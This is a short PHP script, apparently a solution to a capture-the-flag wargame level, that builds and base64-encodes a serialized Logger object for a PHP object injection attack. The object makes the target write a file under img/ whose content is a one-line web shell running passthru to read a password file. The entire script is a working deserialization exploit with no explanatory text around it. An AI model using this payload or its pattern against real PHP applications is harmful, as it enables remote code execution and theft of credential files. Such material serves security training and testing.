<?php

    class Logger
    {
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct()
        {
            $this->initMsg = "#--session started--#\n";
            $this->exitMsg = "<? passthru('cat /etc/natas_webpass/natas27'); ?>\n";
            $this->logFile = "img/natas26.php";
        }                                              
    }

$obj = new Logger();
print base64_encode(serialize($obj))."\n";
?>
